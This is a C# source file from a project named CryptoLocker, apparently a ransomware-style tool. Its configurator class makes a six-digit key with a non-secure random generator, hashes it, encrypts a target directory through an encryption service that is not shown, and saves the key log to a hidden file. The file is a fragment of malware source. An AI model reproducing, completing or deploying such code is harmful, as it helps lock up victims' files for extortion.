using CryptoLocker.Abstractions;
using CryptoLocker.Common;
using CryptoLocker.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;

namespace CryptoLocker.Implements
{
    public class EncryptConfigurator : ConfiguratorBase
    {
        private readonly IEncryptService _service;
        private readonly Log _log;
        public EncryptConfigurator(IEncryptService service, Log log)
        {
            _log = log;
            _service = service;            
        }

        public void Execute()
        {
            GetKey();
            _service.Encrypt(DirectoryPath);
            Save();
        }

        private async void Save()
        {
            var unicueName = Guid.NewGuid().ToString();
            await File.WriteAllLinesAsync(DirectoryPath + $@"\{unicueName}.superuser", _log.GetLines());
            File.SetAttributes(DirectoryPath + $@"\{unicueName}.superuser", FileAttributes.Hidden);
        }

        private void GetKey()
        {
            using var hash = SHA256.Create();
            var rand = new Random();
            var arrayNumb = Enumerable.Range(0, 6).Select(f => rand.Next(0, 9)).ToArray();
            _log.Key = string.Join("", arrayNumb);
            _log.HashKey = hash.ComputeHash(Encoding.UTF8.GetBytes(_log.Key));
        }
    }
}
